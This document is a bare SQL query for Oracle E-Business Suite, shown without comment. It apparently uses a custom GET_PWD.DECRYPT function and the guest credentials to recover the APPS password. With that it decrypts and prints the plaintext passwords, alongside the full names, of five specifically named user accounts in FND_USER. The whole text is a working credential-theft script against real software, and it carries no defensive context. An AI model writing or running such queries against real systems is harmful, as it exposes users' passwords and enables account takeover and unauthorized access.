SELECT
    'USER:' || USR.USER_NAME     AS USER_NAME
   ,'PASS: '
     || GET_PWD.DECRYPT((
        SELECT
            (
                SELECT
                    GET_PWD.DECRYPT(FND_WEB_SEC.GET_GUEST_USERNAME_PWD,USERTABLE.ENCRYPTED_FOUNDATION_PASSWORD)
                FROM
                    DUAL
            )AS APPS_PASSWORD
        FROM
            FND_USER USERTABLE
        WHERE
            USERTABLE.USER_NAME =(
                SELECT
                    SUBSTR(FND_WEB_SEC.GET_GUEST_USERNAME_PWD
                          ,1
                          ,INSTR(FND_WEB_SEC.GET_GUEST_USERNAME_PWD,'/')- 1)
                FROM
                    DUAL
            )
    )
                       ,USR.ENCRYPTED_USER_PASSWORD) AS PASSWORD
   ,'NAME: ' || UPPER(USR.DESCRIPTION)  AS USER_FULL_NAME
FROM
    FND_USER USR
WHERE
    USR.USER_NAME IN('MARTINEZJAI','MARQUEZV','DELEONV','LIMAD','GARCIANM');
